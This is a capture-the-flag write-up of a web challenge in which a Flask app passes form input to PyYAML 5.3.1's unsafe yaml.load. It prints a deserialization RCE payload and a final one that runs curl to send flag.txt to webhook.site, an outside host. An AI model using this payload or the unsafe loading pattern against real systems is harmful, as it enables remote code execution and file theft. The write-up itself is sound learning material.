---
created: 2021-12-21T23:50
updated: 2024-06-21T21:29
---

## Espace 0

The hardest challenge of the web category, but was actually solved before Login Part 0 since my brain was dead

> You've used espace2, but what about espace0?
>
> Flag in `flag.txt`
>
> URL: http://35.240.143.82:4210/

As before the source, `main.py` was given

```python
from flask import Flask, request, render_template, Response
import yaml

app = Flask(__name__)
assert yaml.__version__ == "5.3.1"

@app.route("/")
def index():
    return render_template("./index.html")
    
@app.route("/", methods=["POST"])
def welcome():
    student_data = request.form.get("student_data")
    if not student_data:
        return Response("Please specify some data in YAML format", mimetype='text/plain')
    student_data = yaml.load(student_data)
    required_fields = ["id","name","class"]
    if type(student_data) != dict or "student" not in student_data or any(x not in student_data["student"] for x in required_fields):
        return Response("Malformed data. Please try again.", mimetype='text/plain')
    student = student_data["student"]
    return f"<h1>Welcome, {student['name']} ({student['id']})</h1> <br>Your class is <b>{student['class']}</b>"
```

There are no obvious vulunerabilities to this file.

But the `assert yaml.__version__ == "5.3.1"` part is quite suspicious.

A quite google search with keywords `pyyaml 5.3.1 vulnerabilities` leads us to `https://security.snyk.io/vuln/SNYK-PYTHON-PYYAML-590151`, a 9.8 scored RCE.

Conviniently a `uiuctf` writeup was included that explained how the exploit worked. https://hackmd.io/@harrier/uiuctf20

Apparently it was a zero day vulunrability used in a CTF, what a chad move. We can simply take their payload and use it here as google is allowed in CTFs.

`!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ 'PAYLOAD_HERE' ]]]`

### Sending the payload

`!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ '__import__("os").system("curl -X POST --data-binary @flag.txt https://webhook.site")' ]]]`

![](https://raw.githubusercontent.com/octo-kumo/images/master/image-20211221164628024.png)

And after checking webhook.site for the recieved curl request

```
flag{yet_another_mal-coded_library}
```

Flag obtained
